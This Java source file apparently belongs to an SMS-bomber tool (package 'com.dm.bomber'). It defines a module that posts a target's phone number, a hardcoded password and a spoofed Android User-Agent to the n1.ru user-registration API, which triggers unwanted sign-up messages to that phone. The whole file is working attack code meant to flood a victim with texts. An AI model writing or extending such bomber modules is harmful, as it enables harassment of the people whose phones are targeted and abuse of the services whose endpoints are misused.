package com.dm.bomber.services;

import org.json.JSONException;
import org.json.JSONObject;

import okhttp3.Request;

public class N1RU extends JsonService {

    public N1RU() {
        setUrl("https://api.n1.ru/api/v1/users/");
        setMethod(POST);
        setPhoneCode("7");
    }

    @Override
    public Request buildRequest(Request.Builder builder) {
        builder.addHeader("User-Agent", "N1Realty/1.38.8(Android; Android 30; Build/5011; Device/fJEzTsacyQw; PushVersion/1)");

        return super.buildRequest(builder);
    }

    @Override
    public String buildJson() {
        JSONObject json = new JSONObject();

        try {
            json.put("login", getFormattedPhone());
            json.put("password", "qwertyuiop123");
            json.put("type", "contractor");
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return json.toString();
    }
}
